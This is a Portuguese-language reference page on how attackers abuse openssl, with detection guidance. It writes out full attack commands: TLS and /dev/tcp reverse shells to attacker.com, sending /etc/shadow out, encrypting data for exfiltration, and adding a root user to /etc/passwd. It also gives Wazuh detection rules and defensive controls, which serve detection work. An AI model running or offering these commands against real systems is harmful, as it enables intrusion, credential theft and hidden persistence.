# openssl

**Plataforma:** Linux / macOS / Unix

**Categorias:** Shell reverso cifrado, Transferência de arquivos, Leitura de arquivos, Geração de credenciais

**MITRE ATT&CK:** T1059.004 (Unix Shell), T1048 (Exfiltration), T1573.001 (Encrypted Channel — Symmetric)

**Referência ofensiva:** https://gtfobins.org/gtfobins/openssl/

---

## O que é o openssl

O OpenSSL é a biblioteca e ferramenta de criptografia mais usada em sistemas Linux. Está presente em praticamente todo sistema Unix e oferece uma vasta gama de operações: geração de certificados, criptografia e descriptografia de arquivos, hash, teste de conexões SSL/TLS, encoding base64, e muito mais.

Do ponto de vista de segurança, o aspecto mais crítico é que o openssl suporta criação de conexões TCP e clientes/servidores de rede diretamente da linha de comando — o que o torna capaz de estabelecer shells reversos completamente cifrados sem depender de socat ou ncat.

---

## Por que atacantes usam o openssl

O openssl resolve o principal problema de detecção de shells reversos em redes com SSL inspection: como o canal é cifrado com TLS real, o tráfego é indistinguível de qualquer outra conexão HTTPS para ferramentas que não fazem MITM com validação de certificado. Além disso, o openssl está presente em praticamente todos os sistemas Linux enquanto o socat frequentemente não está.

---

## Técnicas de abuso

### Shell reverso cifrado com TLS

Esta é a técnica principal e mais valiosa. O canal de comunicação é cifrado com TLS, tornando o conteúdo do shell invisível para inspeção de tráfego básica.

```bash
# No servidor do atacante — gerar certificado e iniciar listener
openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes -subj "/CN=attacker"
openssl s_server -quiet -key /tmp/key.pem -cert /tmp/cert.pem -port 4444

# Na vítima — conectar via TLS e executar shell
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect attacker.com:4444 > /tmp/s; rm /tmp/s

# Versão alternativa sem mkfifo
bash -c 'exec bash -i &>/dev/tcp/x/x 0>&1'  # via bash /dev/tcp como alternativa mais simples
```

### Leitura de arquivos via s_client

```bash
# O s_client pode ser usado para ler arquivos via conexão TLS para servidor do atacante
openssl s_client -connect attacker.com:4444 < /etc/shadow

# Exfiltrar com base64 para garantir transmissão de binários
cat /etc/shadow | openssl base64 | openssl s_client -quiet -connect attacker.com:4444
```

### Encode e decode base64

```bash
# Encoding de arquivo para base64 (para exfiltração ou ofuscação)
openssl base64 -in /etc/passwd -out /tmp/passwd.b64
cat /etc/shadow | openssl base64

# Decoding de payload base64
cat payload.b64 | openssl base64 -d > payload.bin

# Diferença em relação ao comando base64: openssl base64 usa quebra de linha a cada 64 chars
# Isso pode ser relevante para contornar filtros que detectam base64 sem quebras
```

### Criptografia e descriptografia de arquivos (exfiltração)

```bash
# Cifrar arquivo antes de exfiltrar (dificulta análise de conteúdo)
openssl enc -aes-256-cbc -salt -in /home/user/documentos.tar.gz -out /tmp/backup.enc -k "senha_do_atacante"

# Descriptografar na máquina do atacante
openssl enc -d -aes-256-cbc -in backup.enc -out documentos.tar.gz -k "senha_do_atacante"
```

### Geração de hash de senha para /etc/passwd

```bash
# Gerar hash de senha compatível com /etc/shadow (para adicionar usuário root)
openssl passwd -6 -salt $(openssl rand -hex 8) "senha123"
# Saída: $6$salt$hash — usar em /etc/shadow ou /etc/passwd

# Adicionar usuário com shell root
echo "hacker:$(openssl passwd -6 'senha123'):0:0:root:/root:/bin/bash" >> /etc/passwd
```

### Teste de conectividade e fingerprinting de serviços SSL

```bash
# Testar conectividade e obter certificado de serviço (reconhecimento)
openssl s_client -connect alvo.com:443 </dev/null

# Verificar versão TLS suportada pelo serviço
openssl s_client -connect alvo.com:443 -tls1_2 </dev/null

# Extrair certificado para análise
echo | openssl s_client -connect alvo.com:443 2>/dev/null | openssl x509 -noout -text
```

---

## Técnicas de bypass e evasão

### Usar porta 443 para parecer HTTPS legítimo

```bash
# O tráfego TLS na porta 443 é quase indistinguível de HTTPS legítimo
# sem SSL inspection com validação de certificado

# Listener na porta 443
openssl s_server -quiet -key /tmp/key.pem -cert /tmp/cert.pem -port 443

# Vítima
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect attacker.com:443 > /tmp/s; rm /tmp/s
```

### Verificação de certificado desabilitada para C2 autoassinado

```bash
# O s_client não verifica certificados por padrão (diferente de navegadores)
# O -quiet suprime informações de handshake que poderiam aparecer em logs
openssl s_client -quiet -connect attacker.com:4444
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- openssl com `s_client` combinado com `mkfifo` e `/bin/sh` ou `/bin/bash` — padrão de shell reverso TLS
- openssl com `s_server` em servidor de produção — listener TLS suspeito
- openssl executado por processo filho de servidor web
- openssl com `enc` em modo de criptografia (`-aes`) aplicado a arquivos de dados — possível ofuscação para exfiltração

**Indicadores de média relevância:**

- openssl `base64` aplicado a arquivos sensíveis (`/etc/shadow`, `/root/*`)
- openssl `s_client` conectando para IPs externos em portas não padrão
- openssl gerando certificados (`req -x509`) em servidores de produção

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/linux/0100-gtfobins_network.xml -->

<!-- openssl s_client com mkfifo — shell reverso TLS -->
<rule id="100245" level="15">
  <if_group>auditd</if_group>
  <field name="audit.command">openssl</field>
  <field name="audit.execve" type="pcre2">s_client.*(mkfifo|/bin/sh|/bin/bash)|s_client.*-connect</field>
  <description>openssl s_client com padrao de shell reverso — canal cifrado TLS para C2</description>
  <mitre>
    <id>T1059.004</id>
    <id>T1573.001</id>
  </mitre>
</rule>

<!-- openssl s_server em produção -->
<rule id="100246" level="13">
  <if_group>auditd</if_group>
  <field name="audit.command">openssl</field>
  <field name="audit.execve" type="pcre2">s_server</field>
  <description>openssl iniciando servidor TLS — possivel listener para shell reverso cifrado</description>
  <mitre>
    <id>T1059.004</id>
  </mitre>
</rule>

<!-- openssl executado por conta de serviço web -->
<rule id="100247" level="12">
  <if_group>auditd</if_group>
  <field name="audit.command">openssl</field>
  <field name="audit.uid" type="pcre2">^(33|65534|99)$</field>
  <description>openssl executado por conta de servico web — contexto suspeito</description>
  <mitre>
    <id>T1059.004</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Administradores e desenvolvedores** — o openssl é amplamente usado para diagnóstico de SSL/TLS, geração de certificados e testes de conectividade. O uso de `s_client` para testar servidores é legítimo e muito comum. O indicador relevante é a combinação com `mkfifo` e redirecionamento de shell, não o `s_client` isolado.

**Scripts de automação de certificados** — scripts de renovação de certificados (certbot, acme.sh) usam openssl extensivamente. Filtre por contexto e argumentos específicos.

---

## Proteção e controles defensivos

**SSL inspection com validação de cadeia de certificados:** para detectar shells reversos TLS via openssl, o proxy corporativo precisa fazer MITM com validação de certificados. Conexões com certificados autoassinados ou cadeias desconhecidas devem gerar alerta — o que não impede o ataque mas o torna visível.

**Monitorar criação de fifo seguida de openssl:** a sequência `mkfifo` → `openssl s_client` é um padrão muito específico. Uma regra de correlação que detecta essa sequência dentro de um curto período de tempo, pelo mesmo usuário, tem baixíssima taxa de falso positivo.

---

## Referências

- GTFOBins — openssl: https://gtfobins.org/gtfobins/openssl/
- MITRE ATT&CK T1573.001: https://attack.mitre.org/techniques/T1573/001/
- MITRE ATT&CK T1059.004: https://attack.mitre.org/techniques/T1059/004/
